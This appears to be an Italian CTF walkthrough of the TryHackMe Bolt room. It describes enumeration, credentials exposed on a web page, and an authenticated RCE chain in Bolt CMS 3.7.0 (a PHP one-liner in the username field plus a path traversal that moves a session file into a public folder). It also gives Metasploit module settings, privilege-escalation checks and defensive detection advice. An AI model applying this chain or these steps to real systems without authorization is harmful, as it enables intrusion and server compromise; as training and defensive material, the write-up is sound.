---
title: 'TryHackMe Bolt: Walkthrough completo (RCE su Bolt CMS)'
slug: thm-bolt-walkthrough
description: 'Write-Up della macchina Bolt di TryHackMe: enumerazione, scoperta credenziali, RCE autenticata su Bolt CMS via session hijacking e privesc a root.'
image: /bolt-walktrough-tryhackme.webp
draft: true
date: 2026-08-10T00:00:00.000Z
categories:
  - walkthroughs
subcategories:
  - easy
tags:
  - bolt-cms
  - try hack me
---

# TryHackMe Bolt: Walkthrough completo

**Room**: [TryHackMe — Bolt](https://tryhackme.com/room/bolt)

Bolt è una macchina TryHackMe pensata per principianti. L'obiettivo didattico è capire il ciclo completo: enumerazione → raccolta credenziali → sfruttamento di una CMS vulnerabile → shell → root. Tutto in ambiente autorizzato, a scopo formativo.

## Enumerazione iniziale

Si parte sempre da una scansione delle porte:

```bash
nmap -sC -sV -oA bolt <IP-TARGET>
```

Sulla macchina risultano tre porte aperte:

* **22** — SSH (Ubuntu)
* **80** — Apache, pagina di default (nessuna informazione utile)
* **8000** — Apache, con un CMS installato

Il punto 80 è un vicolo cieco: pagina placeholder, niente da enumerare. Tutto il lavoro si concentra sulla 8000.

Se preferisci automatizzare gli scan ricorrenti invece di scrivere ogni volta i flag a mano, [mynmap](https://github.com/MyCyb3r/mynmap) è uno script bash che wrappa [nmap](https://hackita.it/articoli/nmap/) con profili di scansione predefiniti (`sudo ./mynmap.sh` per gli scan che richiedono privilegi, es. SYN scan). Utile per velocizzare l'enumerazione iniziale su più macchine, ma il concetto sotto resta sempre lo stesso: scan completo delle porte prima, deep-dive sui servizi interessanti dopo.

## Raccolta informazioni dalla webapp

Visitando la porta 8000 si trova un sito con due messaggi in homepage (uno "IT Department", uno "Admin"). Leggendoli con attenzione saltano fuori username e password in chiaro — un classico errore di esposizione di credenziali in contenuti pubblici, molto comune anche in ambienti reali (intranet, note interne pubblicate per errore).

Il footer della pagina rivela anche il nome e la versione del CMS installato: **Bolt CMS 3.7.0**.

La console di amministrazione di Bolt CMS non è mai in root (`/`), ma sotto un path dedicato: `/bolt/`. Con le credenziali trovate nei messaggi si entra nella dashboard.

**Punto didattico**: prima di lanciare qualsiasi tool automatico, leggere sempre il contenuto testuale della pagina. Tante macchine CTF (e tanti asset reali mal configurati) espongono informazioni sensibili semplicemente nel markup HTML o nei testi visibili.

## Identificare la vulnerabilità

Con nome e versione del CMS si cerca un exploit noto. Due strade equivalenti:

```bash
searchsploit bolt
```

oppure ricerca diretta su Exploit-DB. Escono due risultati distinti, ed è importante non confonderli:

* una vulnerabilità di **file upload** su versioni molto più vecchie (2015) — non applicabile qui;
* una **RCE autenticata**, disclosure di maggio 2020, che colpisce esattamente la versione installata sul target (3.7.0, oltre a tutta la serie 3.6.x). Alla vulnerabilità è stato assegnato in seguito anche un CVE ufficiale (CVE-2025-34086, severità 7.5), a conferma che si tratta di un bug reale e non solo di un esercizio da CTF.

Credito dove è dovuto: la falla è stata scoperta da Sivanesh Ashok (divulgazione pubblica su seclists a luglio 2020), la prima PoC è di r3m0t3nu11, il modulo Metasploit è stato scritto da Erik Wynter.

**Punto didattico**: quando trovi più risultati per lo stesso prodotto, controlla sempre disclosure date e range di versioni prima di scartarne uno.

## Come funziona l'exploit (concetto)

Il meccanismo di attacco su Bolt CMS sfrutta tre debolezze concatenate:

1. **Assenza di sanitizzazione** sul campo username in `/bolt/profile` → un utente già autenticato può cambiarlo in un one-liner PHP tipo `system($_GET['x'])`. Il campo ha un limite di caratteri, quindi il payload deve restare minimale.
2. **Directory traversal** nell'endpoint `/async/folder/rename`, usato normalmente per rinominare file interni al CMS → recuperando i token di sessione da `/async/browse/cache/.sessions`, si può rinominare il file di sessione (che ora contiene il payload iniettato nello username) spostandolo con un path tipo `../../../public/files/<nome>.php`, cioè fuori dalla cartella privata e dentro una servita pubblicamente.
3. Una volta che il file di sessione è raggiungibile via HTTP come `.php` in una cartella pubblica, il payload al suo interno viene eseguito dal server richiamando `/files/<nome>.php?x=<comando>`.

Il risultato: RCE che, su questa macchina, restituisce una shell già come **root** — non il generico "utente del webservice" che ci si aspetterebbe. È una particolarità di come THM ha configurato il container, non del bug in sé (in un deployment reale l'RCE gira tipicamente con i permessi del processo Bolt, che potrebbe essere un utente non privilegiato).

**Perché è importante capirlo e non solo eseguirlo**: è lo stesso pattern che si trova in decine di CVE diverse — "file scrivibile dall'utente" + "endpoint che sposta/rinomina file senza validare il path" = esecuzione codice. Riconoscere lo schema è più utile che ricordare il singolo CVE.

## Sfruttamento via Metasploit

Chi preferisce l'approccio rapido può usare il modulo Metasploit dedicato. Lanciando `search bolt` dentro `msfconsole` compaiono entrambi gli exploit citati sopra — quello corretto per questo caso è `exploit/unix/webapp/bolt_authenticated_rce`. Una volta caricato con `use`, vanno impostati i parametri standard:

```
set RHOSTS <IP-TARGET>
set LHOST <TUO-IP>
set USERNAME <trovato in homepage>
set PASSWORD <trovata in homepage>
run
```

## Sfruttamento manuale (consigliato per capire davvero)

Per chi vuole vedere cosa succede sotto al modulo Metasploit, i passaggi concettuali sono:

1. Login sulla pagina di amministrazione del CMS con le credenziali trovate.
2. In `/bolt/profile`, modifica dello username inserendo il payload PHP minimale per l'esecuzione comandi via parametro GET.
3. Recupero di un token valido dalla dashboard (necessario per le richieste successive).
4. Richiesta (intercettabile e modificabile con un proxy come Burp) verso `/async/folder/rename`, specificando come "nuovo nome" un path che esce dalla cartella sessioni e finisce nella cartella pubblica dei file — il classico path traversal con `../../../`.
5. A quel punto il file di sessione (contenente il payload) è raggiungibile via browser sotto `/files/`.
6. Richiamandolo con il parametro del payload si ottiene esecuzione comandi, e da lì una reverse shell.

Non riporto qui il payload esatto carattere per carattere: l'obiettivo è che tu lo ricostruisca capendo la logica (payload PHP corto che esegue system() sul parametro GET), non che lo copi-incolli.

## Niente privesc: sei già root

Appena la shell arriva, un `whoami` conferma che sei già **root** — su questa macchina non serve nessuna escalation separata. La flag si trova in `/home/flag.txt` (non in `/root/`, dettaglio curioso ma irrilevante ai fini pratici visto che sei root e leggi ovunque).

È una scelta di design tipica delle macchine "easy": l'obiettivo del room è far interiorizzare il flusso enumerazione → ricerca exploit → sfruttamento, senza appesantire con una privesc separata.

Detto questo, in un vero engagement (o su una macchina "medium/hard") non puoi mai dare per scontato di finire root subito: verifica sempre con `whoami`/`id`, e se non lo sei enumera con `sudo -l`, ricerca binari SUID (`find / -perm -4000 2>/dev/null`) e cron job scrivibili.

## Detection & Blue Team

Dal lato difensivo, questo tipo di attacco lascia tracce riconoscibili:

* **Credenziali in chiaro in pagine pubbliche**: individuabili con scansioni periodiche di content-discovery e revisione manuale dei contenuti pubblicati.
* **Upload/rename di file con estensione eseguibile in cartelle pubbliche**: un WAF o una regola su reverse proxy che blocchi la scrittura di file `.php` in directory servite staticamente (upload folder) mitiga l'intera catena.
* **Input non sanitizzato su campi profilo**: qualunque campo utente che finisce scritto su disco (session file, log, cache) va trattato come potenziale vettore di code injection, non solo i campi "ovvi" come i form di ricerca.
* **Log applicativi**: richieste verso endpoint interni di gestione file (rename/move) con parametri contenenti `../` sono un segnale chiaro da alertare.

## Conclusione

Bolt è una macchina semplice ma insegna un pattern reale: informazioni sensibili esposte per errore + una catena di vulnerabilità web (stored injection + path traversal) che porta a RCE. Vale la pena rifarla senza Metasploit, a mano, per capire ogni passaggio della catena prima di affidarsi al modulo automatico.

## Fonti e approfondimenti

* [Modulo Metasploit ufficiale](https://www.rapid7.com/db/modules/exploit/unix/webapp/bolt_authenticated_rce/) — Rapid7 VulnDB, dettaglio tecnico del modulo
* [GitHub Advisory / CVE-2025-34086](https://github.com/advisories/GHSA-p9qc-8jjx-g8cg) — scheda CVE ufficiale con CVSS
* [nmap](https://hackita.it/articoli/nmap/) e [metasploit](https://hackita.it/articoli/metasploit/) — articoli correlati su Hackita
